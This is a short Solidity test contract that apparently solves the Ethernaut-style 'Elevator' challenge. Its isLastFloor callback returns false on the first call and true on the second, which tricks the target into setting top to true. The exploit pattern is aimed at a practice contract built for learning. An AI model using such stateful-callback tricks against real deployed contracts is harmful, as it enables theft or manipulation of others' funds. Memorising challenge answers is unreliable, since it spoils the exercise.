// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../contracts/11Elevator.sol";
import "../contracts/utils/TestWithSetup.sol";

contract ElevatorAttack is TestWithSetup {

    Elevator private challengeContract;
    uint256 public timesCalled;

    constructor () {
        challengeContract = new Elevator();
    }

    function testAttack () public {
        challengeContract.goTo(0);
        assertEq(challengeContract.top(), true);
    }

    function isLastFloor (uint) external returns (bool) {
        timesCalled++;
        if (timesCalled > 1){
            return true;
        }
        else {
            return false;
        }
    }

}